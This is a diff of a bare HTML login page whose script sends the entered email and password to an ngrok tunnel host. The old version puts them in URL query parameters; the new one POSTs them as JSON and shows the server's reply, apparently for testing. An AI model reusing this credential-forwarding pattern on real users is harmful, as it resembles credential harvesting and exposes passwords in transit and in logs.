@@ -1,66 +1,65 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta charset="utf-8" />
   <title>Login Page</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      display: flex;
-      height: 100vh;
-      justify-content: center;
-      align-items: center;
-      background-color: #f4f4f4;
-    }
-    .login-container {
-      background: white;
-      padding: 2rem;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    .login-container h2 {
-      margin-bottom: 1rem;
-    }
-    .login-container input {
-      width: 100%;
-      padding: 0.5rem;
-      margin: 0.5rem 0 1rem;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-    }
-    .login-container button {
-      width: 100%;
-      padding: 0.5rem;
-      background-color: #007bff;
-      border: none;
-      color: white;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-    .login-container button:hover {
-      background-color: #0056b3;
-    }
+    body { font-family: system-ui, sans-serif; max-width: 640px; margin: 40px auto; }
+    label { display:block; margin-top: 12px; }
+    input { padding: 8px; width: 100%; box-sizing: border-box; }
+    button { margin-top: 12px; padding: 10px 14px; }
+    pre { background:#f4f4f4; padding:12px; border-radius:6px; }
   </style>
 </head>
 <body>
-  <div class="login-container">
-    <h2>Login</h2>
-    <form id="loginForm">
-      <input type="email" id="email" placeholder="Email" required />
-      <input type="password" id="password" placeholder="Password" required />
-      <button type="submit">Login</button>
-    </form>
-  </div>
+  <h1>Login</h1>
+  <form id="credForm">
+    <label>
+      Email
+      <input type="email" id="email" required>
+    </label>
+    <label>
+      Password
+      <input type="password" id="password" required>
+    </label>
+    <button type="submit">Send</button>
+  </form>
+
+  <h3>Server response</h3>
+  <pre id="output">No response yet.</pre>
 
   <script>
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      const email = encodeURIComponent(document.getElementById('email').value);
-      const password = encodeURIComponent(document.getElementById('password').value);
-      const targetURL = `https://90b18fb1d2a3.ngrok-free.app/login?email=${email}&password=${password}`;
-      window.location.href = targetURL;
+    const NGROK_URL = 'https://1b28dd7edad0.ngrok-free.app';
+    const ENDPOINT = NGROK_URL + '/login';
+
+    document.getElementById('credForm').addEventListener('submit', async (ev) => {
+      ev.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      const out = document.getElementById('output');
+      out.textContent = 'Sending...';
+
+      try {
+        const resp = await fetch(ENDPOINT, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'ngrok-skip-browser-warning': 'yes' },
+          body: JSON.stringify({ email, password })
+        });
+
+        const data = await resp.json();
+
+        if (!resp.ok) {
+          out.textContent = `Error ${resp.status}: ${JSON.stringify(data, null, 2)}`;
+          return;
+        }
+
+      
+        out.textContent = JSON.stringify(data, null, 2);
+      } catch (err) {
+        out.textContent = 'Network error: ' + err.message;
+        console.error(err);
+      }
     });
   </script>
 </body>
